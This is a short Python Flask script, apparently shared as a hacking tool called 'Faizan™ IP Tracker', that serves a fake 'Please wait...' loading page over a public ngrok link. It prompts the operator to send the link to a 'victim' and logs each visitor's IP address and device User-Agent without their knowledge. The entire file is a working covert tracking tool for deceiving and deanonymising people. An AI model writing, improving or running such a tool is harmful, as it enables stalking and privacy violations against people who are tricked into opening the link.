import os
from flask import Flask, request, render_template_string
from pyngrok import ngrok

app = Flask(__name__)

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h2 style='text-align:center; margin-top:20%;'>Please wait...</h2>
</body>
</html>
"""

@app.route('/')
def track():
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    print(f"\n📥 Victim Detected!")
    print(f"🌐 IP Address: {ip}")
    print(f"🖥️ Device Info: {ua}")
    return render_template_string(HTML_PAGE)

def start_server(port=5000):
    os.system("clear")
    print("╔═══════════════════════════════════════════╗")
    print("║   Faizan™ IP Tracker v3.0 - @HACKER_189   ║")
    print("╚═══════════════════════════════════════════╝\n")

    try:
        public_url = ngrok.connect(port)
        print(f"🔗 Send this link to victim:\n\033[1;32m{public_url}\033[0m\n")
        app.run(host="0.0.0.0", port=port)
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    start_server()
